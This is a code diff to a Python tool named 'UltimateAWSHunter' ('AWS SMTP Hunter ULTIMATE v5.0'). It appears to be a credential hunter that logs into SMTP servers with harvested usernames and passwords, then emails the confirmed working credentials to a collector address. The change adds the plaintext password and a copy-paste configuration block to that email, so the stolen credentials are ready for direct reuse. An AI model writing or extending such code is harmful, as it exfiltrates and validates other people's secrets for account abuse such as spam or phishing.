@@ -2113,24 +2113,47 @@ class UltimateAWSHunter:
                     
             server.login(username, password)
             
-            # Création du message
+            # Création du message AVEC CREDENTIALS COMPLETS
             msg = MIMEMultipart()
             msg['From'] = username
             msg['To'] = self.test_email
-            msg['Subject'] = f"🔥 SMTP Working - {host} from {source_ip}"
+            msg['Subject'] = f"🔥 SMTP WORKING + CREDENTIALS - {host} from {source_ip}"
             
+            # BODY AVEC MOT DE PASSE ET CREDENTIALS COMPLETS
             body = f"""
 🔥 SMTP CREDENTIALS VERIFIED AND WORKING! 🔥
 
 Source IP: {source_ip}
-SMTP Host: {host}:{port}
+SMTP Host: {host}
+SMTP Port: {port}
 Username: {username}
-TLS: {use_tls}
+Password: {password}
+TLS/SSL: {use_tls}
 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 Scanner: AWS SMTP Hunter ULTIMATE v5.0
 
+===============================================
+📧 CREDENTIALS READY TO USE:
+===============================================
+Host: {host}
+Port: {port}
+Username: {username}
+Password: {password}
+Encryption: {'TLS' if use_tls else 'None'}
+
+===============================================
+🚀 EXAMPLE CONFIGURATION:
+===============================================
+MAIL_HOST={host}
+MAIL_PORT={port}
+MAIL_USERNAME={username}
+MAIL_PASSWORD={password}
+MAIL_ENCRYPTION={'tls' if use_tls else 'none'}
+
 This email confirms that the SMTP credentials are VALID and WORKING!
-You can use these credentials for email sending.
+You can copy-paste these credentials directly into your applications.
+
+Happy emailing! 🎉
 """
             
             msg.attach(MIMEText(body, 'plain'))
